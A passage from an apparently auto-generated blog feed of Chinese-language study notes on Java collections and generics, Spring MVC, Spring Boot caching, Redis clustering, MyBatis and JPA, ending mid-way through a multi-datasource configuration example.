class="token function">调用equals</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法比较对象内容是否相等final<span class="token operator">=></span>operation<span class="token operator">:</span> 说明元素重复，不存储st<span class="token operator">-</span><span class="token operator">></span>opt<span class="token operator">-</span><span class="token operator">></span>cond<span class="token function">cond</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>e<span class="token function">cond</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>op<span class="token function">e</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>op<span class="token function">e</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>demo<span class="token function">demo</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>op<span class="token function">demo</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>final<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LinkedHashCode集合">LinkedHashCode集合</h3><ul><li>哈希表和链表实现的Set接口，具有可预测的迭代顺序</li><li>有链表保证存取有序，也就是说，元素的储存和取出顺序是一样的</li><li>有哈希表保证元素唯一</li></ul><h3 id="TreeSet集合">TreeSet集合</h3><ul><li>元素有序，按照一定规则进行排序<ul><li>TreeSet(): 根据元素的自然排列顺序进行排序</li><li>TreeSet(Comparator comparator):根据指定的比较器排序</li></ul></li><li>没有带索引的方法</li><li>不包含重复元素</li></ul><h4 id="自然排序Comparable的使用">自然排序Comparable的使用</h4><ul><li><p>用TreeSet集合储存自定义对象，无参构造方法使用的是自然排序对元素进行排序的</p></li><li><p>自然排序，就是让元素所属的类实现Comparable接口，重写comparaTo(T o)方法</p></li><li><p>重写方法时，一定要注意排序规则，必须按照要求的主要条件和次要条件来写</p></li></ul><h4 id="比较器排序Comparator的使用">比较器排序Comparator的使用</h4><ul><li>用TreeSet集合储存自定义对象，带参构造方法使用的是比较器排序对元素进行排序的</li><li>比较器排序，就是让集合构造方法接受Comparator的实现类方法，重写compare(T 01,T 02)方法</li><li>重写方法时，一定要注意排序规则必须按照要求的主要条件和次要条件来写</li></ul><h2 id="泛型">泛型</h2><ul><li>是JDK5中引入的特性，它提供了编译时类型安全检测机制，该机制允许在编译时检测到非法的类型它的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？顾名思义，就是将类型由原来的具体的类型参数化，然后在使用/调用时传入具体的类型。这种参数类型可以用在类、方法和接口中，分别被称为泛型类、泛型方法、泛型接口</li><li>泛型定义格式<ul><li>&lt;类型&gt;：指定一种类型的格式。这里的类型可以看成是形参</li><li>&lt;类型1,类型2…&gt;：指定多种类型的格式，多种类型之间用逗号隔开。这里的类型可以看成是形参</li><li>将来具体调用时候给定的类型可以看成是实参，并且实参的类型只能是引用数据类型</li></ul></li><li>泛型的好处<ul><li>把运行时期的问题提前到了编译期间</li><li>避免了强制类型转换</li></ul></li></ul><h3 id="泛型类">泛型类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Generic</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token class-name">T</span> t<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">getT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setT</span><span class="token punctuation">(</span><span class="token class-name">T</span> t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>t <span class="token operator">=</span> t<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenericDemo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Generic</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> g1 <span class="token operator">=</span> newGeneric<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        g1<span class="token punctuation">.</span><span class="token function">setT</span><span class="token punctuation">(</span><span class="token string">"林青霞"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>g1<span class="token punctuation">.</span><span class="token function">getT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Generic</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> g2 <span class="token operator">=</span> newGeneric<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        g2<span class="token punctuation">.</span><span class="token function">setT</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>g2<span class="token punctuation">.</span><span class="token function">getT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Generic</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span> g3 <span class="token operator">=</span> newGeneric<span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        g3<span class="token punctuation">.</span><span class="token function">setT</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>g3<span class="token punctuation">.</span><span class="token function">getT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="泛型方法">泛型方法</h3><p><code>修饰符 &lt;类型&gt; 返回值类型 方法名(类型 变量名)&#123;&#125;</code></p><h3 id="泛型接口">泛型接口</h3><p><code>修饰符 interfacce 接口名&lt;类型&gt;&#123;&#125;</code></p><h3 id="类型通配符">类型通配符</h3><ul><li><p>类型通配符的作用</p><p>为了表示各种泛型List的父类，可以使用类型通配符</p></li><li><p>类型通配符的分类</p><ul><li>类型通配符:&lt;?&gt;<ul><li>List&lt;?&gt;:表示元素类型未知的List,它的元素可以匹配任何的类型</li><li>这种带通配符的List仅表示它是各种泛型List的父类，并不能把元素添加到其中</li></ul></li><li>类型通配符上限：&lt;? extends 类型&gt;<ul><li>List&lt;? extends Number&gt;：它表示的类型是Number或者其子类型</li></ul></li><li>类型通配符下限：&lt;? super 类型&gt;<ul><li>List&lt;? super Number&gt;：它表示的类型是Number或者其父类型</li></ul></li></ul></li></ul><h2 id="可变参数">可变参数</h2><ul><li><p>介绍</p><p>可变参数又称参数个数可变，用作方法的形参出现，那么方法参数个数就是可变的</p></li><li><p>可变参数的注意事项</p><ul><li>这里的变量其实是一个数组</li><li>如果一个方法有多个参数，包含可变参数，可变参数要放是最后</li></ul></li><li><p>Arrays工具类中有一个静态方法：</p><ul><li>public static List asList(T… a)：返回由指定数组支持的固定大小的列表</li><li>返回的集合不能做增删操作，可以做修改操作</li></ul></li><li><p>List接口中有一个静态方法：</p><ul><li>public static List of(E… elements)：返回包含任意数量元素的不可变列表</li><li>返回的集合不能做增删改操作</li></ul></li><li><p>Set接口中有一个静态方法：</p><ul><li>public static Set of(E… elements) ：返回一个包含任意数量元素的不可变集合</li><li>在给元素的时候，不能给重复的元素</li><li>返回的集合不能做增删操作，没有修改的方法</li></ul></li></ul><h2 id="Map集合">Map集合</h2><h3 id="Map的集合概述和特点">Map的集合概述和特点</h3><ul><li><p>Map集合概述</p><p><code>interfacce Map&lt;K,V&gt; K:键的类型；V:值的类型</code></p></li><li><p>Map集合的特点</p><ul><li>键值对应关系</li><li>一个键对应一个值</li><li>键不能重复，值可以重复</li><li>元素存取无序</li></ul></li></ul><h3 id="Map集合的基本使用">Map集合的基本使用</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>V put(k key,V value)</td><td>添加元素</td></tr><tr><td>V remove(Object key)</td><td>根据键删除键值对元素</td></tr><tr><td>void clear()</td><td>移除所有的键值对元素</td></tr><tr><td>boolean containsKey(Object key)</td><td>判断集合是否包含指定的键</td></tr><tr><td>boolean containsValue(Object value)</td><td>判断集合是否包含指定的值</td></tr><tr><td>boolean isEmpty()</td><td>判断集合是否为空</td></tr><tr><td>int size()</td><td>集合的长度，也就是集合中键值对的个数</td></tr></tbody></table><h3 id="Map集合的获取功能">Map集合的获取功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>V get(Object key)</td><td>根据键获取值</td></tr><tr><td>Set keySet()</td><td>获取所有键的集合</td></tr><tr><td>Collection values()</td><td>获取所有值的集合</td></tr><tr><td>Set&lt;Map.Entry&lt;K,V&gt;&gt;entrySet()</td><td>获取所有键值对的集合</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC</title>
      <link href="/2021/03/07/2021-03-07-Spring-MVC/"/>
      <url>/2021/03/07/2021-03-07-Spring-MVC/</url>
      
        <content type="html"><![CDATA[<p>初识MVC</p><span id="more"></span><h2 id="Spring-MVC-常用注解">Spring MVC 常用注解</h2><ul><li>@Controller<ul><li>RestController</li></ul></li><li>@RequestMapping<ul><li>@GetMapping / @PostMapping</li><li>@PutMapping / @DeleteMapping</li><li>@RequestBody / @ResponseBody / @ResponseStatus</li></ul></li></ul><h2 id="Spring-MVC-请求处理机制">Spring MVC 请求处理机制</h2><p><strong>绑定一些Attribute</strong></p><ul><li>WebApplicationContext / LocaleResolver / ThemeResolver</li></ul><p><strong>处理Multipart</strong></p><ul><li>如果是，则将请求转为MultipartHttpServeletRequest</li></ul><p><strong>Handler处理</strong></p><ul><li>如果找到对应的Handler，执行Controller及前后置处理器逻辑</li></ul><p><strong>处理返回的Model，呈现视图</strong></p><h2 id="如何定义处理方法">如何定义处理方法</h2><h3 id="定义映射关系">定义映射关系</h3><p>@Controller</p><p>@RequestMapping</p><ul><li>Path / method 指定映射路径与方法</li><li>params / headers 限定映射范围</li><li>consumes / produces 限定请求与响应格式</li></ul><p>一些快捷方式</p><ul><li>@RestController</li><li>@GetMapping / @PutMapping / @PostMapping / @DeleteMapping / @PatchMapping</li></ul><h3 id="定义处理方法">定义处理方法</h3><ul><li><p>@RequestBody / @ResponseBody / @ResponseStatus</p></li><li><p>@PathVariable / @RequestParam / @RequestHeader</p></li><li><p>HttpEntity / ResponseEntity</p></li><li><p>详细参数</p><p><a href="https://docs.spring.io/spring/docs/5.1.5.RELEASE/spring-framework-reference/web.html#mvc-ann-arguments">https://docs.spring.io/spring/docs/5.1.5.RELEASE/spring-framework-reference/web.html#mvc-ann-arguments</a></p></li><li><p>详细返回</p><p><a href="https://docs.spring.io/spring/docs/5.1.5.RELEASE/spring-framework-reference/web.html#mvc-ann-return-tpes">https://docs.spring.io/spring/docs/5.1.5.RELEASE/spring-framework-reference/web.html#mvc-ann-return-tpes</a></p></li></ul><h3 id="定义类型转换">定义类型转换</h3><p>自己实现WebMvcConfigurer</p><ul><li>Spring Boot 在WebMvcAutoConfiguration中实现了一个</li><li>添加自定义的Converter</li><li>添加自定义的Formatter</li></ul><h3 id="定义校验">定义校验</h3><ul><li>通过Validator对绑定结果进行校验<ul><li>Hibernate Validator</li></ul></li><li>@Valid注解</li><li>BingdingResult</li></ul><h3 id="Multipart上传">Multipart上传</h3><ul><li>配置MultipartResolver<ul><li>Spring Boot 自动配置 MultipartAutoConfiguration</li></ul></li><li>支持类型multipart/from-data</li><li>MultipartFile类型</li></ul><h2 id="视图处理">视图处理</h2><h3 id="视图解析的实现基础">视图解析的实现基础</h3><p><strong>ViewResolver与View接口</strong></p><ul><li>AbstractCachingViewResolver</li><li>UrlBasedViewResolver</li><li>FreeMarkerViewResolver</li><li>ContentNegotiatingViewResolver</li><li>InternalResourceViewResolver</li></ul><p><strong>DispatcherServlet中的视图解析逻辑</strong></p><ul><li>initStrategies()<ul><li>initViewResolvers()初始化了对应ViewResolver</li></ul></li><li>doDispatch()<ul><li>processDispatchResult()<ul><li>没有返回视图的话，尝试RequestToViewNameTranslator</li><li>resolveViewName()解析View对象</li></ul></li></ul></li></ul><p><strong>使用@ResponseBody的情况</strong></p><ul><li>在HanderAdapter.handle()的中完成了Response的输出<ul><li>RequestMappingHandlerAdapter.invokeHandlerMethod()<ul><li>HandlerMethodReturnValueHandlerComposite.handlerReturnValue()<ul><li>RequestResponseBodyMethodProcessor.handleReturnValue()</li></ul></li></ul></li></ul></li></ul><h3 id="重定向">重定向</h3><p><strong>两种不同的重定向前缀</strong></p><ul><li>redirect</li><li>forward</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态资源与缓存</title>
      <link href="/2021/03/07/2021-03-07-%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E4%B8%8E%E7%BC%93%E5%AD%98/"/>
      <url>/2021/03/07/2021-03-07-%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E4%B8%8E%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 中的静态资源与缓存</p><span id="more"></span><h2 id="Spring-Boot中的静态资源配置">Spring Boot中的静态资源配置</h2><h3 id="核心逻辑">核心逻辑</h3><ul><li>WebConfigurer.addResourceHandlers()</li></ul><h3 id="常用配置">常用配置</h3><ul><li>spring.mvc.static-path-pattern=/**</li><li>spring.resource.static-locations=classpath:/META-INF/resources/,classpath:/resources/,classpath:/path,classpath:/public/</li></ul><h2 id="Spring-Boot中的缓存配置">Spring Boot中的缓存配置</h2><h3 id="常用配置（默认单位时间为秒）">常用配置（默认单位时间为秒）</h3><ul><li>ResourceProperties.Cache</li><li>spring.resource.cache.cachecontrol.max-age=时间</li><li>spring.resource.cache.cachecontrol.no-cache=true/false</li><li>spring.resource.cache.cachecontrol.s-max-age=时间</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static resource&amp;&amp;cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis的哨兵与集群模式</title>
      <link href="/2021/03/06/2021-03-06-Redis%E7%9A%84%E5%93%A8%E5%85%B5%E4%B8%8E%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/03/06/2021-03-06-Redis%E7%9A%84%E5%93%A8%E5%85%B5%E4%B8%8E%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="哨兵模式">哨兵模式</h2><p><strong>Redis Sentinel 是 Redis 的一种高可用的方案</strong></p><ul><li>监控、通知、自动故障转移、服务发现</li></ul><p><strong>JedisSentinelPool</strong></p><h2 id="集群模式">集群模式</h2><p><strong>Redis Cluster</strong></p><ul><li>数据自动分片（分成16384个Hash Slot）</li><li>在部分节点失效时有一定可用性</li></ul><p><strong>JedisCluster</strong></p><ul><li>Jedis只从master读数据，如果想实现读写分离，可以定制</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot配置缓存</title>
      <link href="/2021/03/06/2021-03-06-Spring-Boot%E9%85%8D%E7%BD%AE%E7%BC%93%E5%AD%98/"/>
      <url>/2021/03/06/2021-03-06-Spring-Boot%E9%85%8D%E7%BD%AE%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<ul><li><p>pom.xml</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-cache<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-data-redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>application.properties</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">spring.cache.type</span> <span class="token punctuation">=</span> <span class="token attr-value">redis</span><span class="token attr-name">spring.cache.cache-names</span> <span class="token punctuation">=</span> <span class="token attr-value">coffee</span><span class="token attr-name">spring.cache.redis.time-to-live</span> <span class="token punctuation">=</span> <span class="token attr-value">5000</span><span class="token attr-name">spring.cache.redis.cache-null-values</span> <span class="token punctuation">=</span> <span class="token attr-value">false</span><span class="token attr-name">spring.redis.host</span> <span class="token punctuation">=</span> <span class="token attr-value">localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识MyBatis</title>
      <link href="/2021/03/04/2021-03-04-%E8%AE%A4%E8%AF%86MyBatis/"/>
      <url>/2021/03/04/2021-03-04-%E8%AE%A4%E8%AF%86MyBatis/</url>
      
        <content type="html"><![CDATA[<h2 id="认识MyBatis">认识MyBatis</h2><p><strong>MyBatis</strong></p><ul><li>一款优秀的持久层框架</li><li>支持定制化SQL、储存过程和高级映射</li></ul><p><strong>在Spring中使用MyBatis</strong></p><ul><li>MyBatis Spring Adapter</li><li>MyBatis Spring-Boot-Starter</li></ul><p><strong>简单的配置</strong></p><ul><li>mybatis.mapper-locations = classpath*:mapper/**/*.xml</li><li>mybatis.type-aliases-package = 类型的别名的包名</li><li>mybatis.type-handlers-package = TypeHandler扫描包名</li><li>mybatis.configuration.map-underscore-to-camel-case=true</li></ul><h2 id="Mapper的定义与扫描">Mapper的定义与扫描</h2><ul><li>@MapperScan配置扫描位置</li><li>@Mapper定义接口</li><li>映射的定义 – XML与注解</li></ul><h2 id="Attention">Attention</h2><ul><li>@Repository是Spring的注解，@Mapper是MyBatis的注解</li><li>@Mapper 一定要有，否则 Mybatis 找不到 mapper。</li><li>@Repository 可有可无，可以消去依赖注入的报错信息。</li><li>@MapperScan 可以替代 @Mapper</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Repository Bean 是如何创建的</title>
      <link href="/2021/03/03/2021-03-03-Repository-Bean-%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E7%9A%84/"/>
      <url>/2021/03/03/2021-03-03-Repository-Bean-%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Repository的创建">Repository的创建</h2><p><strong>JpaRepositoriesRegister</strong></p><ul><li>激活了@EnableJpaRepositories</li><li>返回了JpaRepositoryConfigExtension</li></ul><p><strong>RepositoryBeanDefinitionRegistrarSupport.registerBeanDefinitions</strong></p><ul><li>注册Repository Bean (类型是JpaRepositoryFactoryBean)</li></ul><p><strong>RepositoryConfigurationExtensionSupport.getRepositoryConfigurations</strong></p><ul><li>取得Repository配置</li></ul><p>JpaRepositoryFactory.getTargetRepository</p><ul><li>创建了Repository</li></ul><h2 id="接口中的方法是如何被解释的">接口中的方法是如何被解释的</h2><p><strong>RepositoryFactorySupport.getRepository添加了Advice</strong></p><ul><li>DefaultMethodInvokingMethodInterceptor</li><li>QueryExcutorMethodInterceptor</li></ul><p><strong>AbstarctJpaQuery.execute执行具体的查询</strong></p><p>语法解析在Part中</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bean </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring JPA</title>
      <link href="/2021/03/03/2021-03-03-Spring%20JPA/"/>
      <url>/2021/03/03/2021-03-03-Spring%20JPA/</url>
      
        <content type="html"><![CDATA[<!--!more--><h2 id="table">table</h2><p><code>@MappedSuperclass</code> 是类级别注解，该注解没有任何参数，被该注解标注的类不会映射到数据库中单独的表，但该类所拥有的属性都将映射到其子类的数据库表的列中。</p><p><code>@Entity</code>注释指名这是一个实体Bean，@Table注释指定了Entity所要映射带数据库表，其中@Table.name()用来指定映射表的表名。<br>如果缺省@Table注释，系统默认采用类名作为映射表的表名。实体Bean的每个实例代表数据表中的一行数据，行中的一列对应实例中的一个属性。</p><p><code>@Column</code>注释定义了将成员属性映射到关系表中的哪一列和该列的结构信息，属性如下：<br>1）name：映射的列名。如：映射tbl_user表的name列，可以在name属性的上面或getName方法上面加入；<br>2）unique：是否唯一；<br>3）nullable：是否允许为空；<br>4）length：对于字符型列，length属性指定列的最大字符长度；<br>5）insertable：是否允许插入；<br>6）updatetable：是否允许更新；<br>7）columnDefinition：定义建表时创建此列的DDL；<br>8）secondaryTable：从表名。如果此列不建在主表上（默认是主表），该属性定义该列所在从表的名字。<br><code>@Id</code>注释指定表的主键，它可以有多种生成方式：</p><p>1）TABLE：容器指定用底层的数据表确保唯一；<br>2）SEQUENCE：使用数据库德SEQUENCE列莱保证唯一（Oracle数据库通过序列来生成唯一ID）；<br>3）IDENTITY：使用数据库的IDENTITY列莱保证唯一；<br>4）AUTO：由容器挑选一个合适的方式来保证唯一；<br>5）NONE：容器不负责主键的生成，由程序来完成。</p><p><code>@GeneratedValue</code>注释定义了标识字段生成方式。</p><p><code>@Temporal</code>注释用来指定java.util.Date或java.util.Calender属性与数据库类型date、time或timestamp中的那一种类型进行映射。</p><p><code>@Temporal</code>(value=TemporalType.TIME)</p><h2 id="映射规则">映射规则</h2><p>映射规则：</p><ol><li><p>实体类<strong>必须</strong>用 @javax.persistence.<strong>Entity</strong> 进行注解；</p></li><li><p><strong>必须</strong>使用 @javax.persistence.<strong>Id</strong> 来注解一个主键；</p></li><li><p>实体类必须拥有一个 <strong>public 或者 protected</strong> 的<strong>无参</strong>构造函数，之外实体类还可以拥有其他的构造函数；</p></li><li><p>实体类必须是一个<strong>顶级类</strong>（top-level class）。一个枚举（enum）或者一个接口（interface）不能被注解为一个实体；</p></li><li><p>实体<strong>类</strong>不能是 <strong>final 类型</strong>的，也<strong>不能有 final 类型</strong>的方法；</p></li><li><p>如果实体类的一个实例需要用传值的方式调用（例如，远程调用），则这个实体类必须实现（implements）java.io.Serializable 接口。</p></li></ol><h2 id="Repository">Repository</h2><ul><li>CrudRepository &lt;T ,ID&gt;一些简单的方法</li><li>PagingAndSortingRepository&lt;T, ID&gt;</li><li>JpaRepository&lt;T, ID&gt;</li></ul><p><code>@enableJpaRepository</code></p><p><strong>定义查询</strong></p><ul><li>find By/read By/query By/get By</li><li>count By</li><li>OrderBy [Asc / Desc]</li><li>And / Or / IgnoreCase</li><li>Top / First / Distinct</li></ul><p><strong>分页查询</strong></p><ul><li>PagingAndSortingRepository&lt;T,ID&gt;</li><li>Pageable / Sort</li><li>Slice<T> / Page<T></li></ul><p><strong>查询实体</strong></p><p><code>NoRepositoryBean</code>仅在开始扩展具有功能的所有存储库时才需要它</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置多数据源</title>
      <link href="/2021/03/03/2021-03-03-%E9%85%8D%E7%BD%AE%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90/"/>
      <url>/2021/03/03/2021-03-03-%E9%85%8D%E7%BD%AE%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>启动类</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token punctuation">(</span>exclude <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token class-name">DataSourceAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>        <span class="token class-name">DataSourceTransactionManagerAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>        <span class="token class-name">JdbcTemplateAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MultiDataSourceDemoApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">MultiDataSourceDemoApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span><span class="token string">"foo.datasource"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">DataSourceProperties</span> <span class="token function">fooDataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">fooDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DataSourceProperties</span> dataSourceProperties <span class="token operator">=</span> <span class="token function">fooDataSourceProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"foo datasource: &#123;&#125;"</span><span class="token punctuation">,</span> dataSourceProperties<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dataSourceProperties<span class="token punctuation">.</span><span class="token function">initializeDataSourceBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">public</span> <span class="token 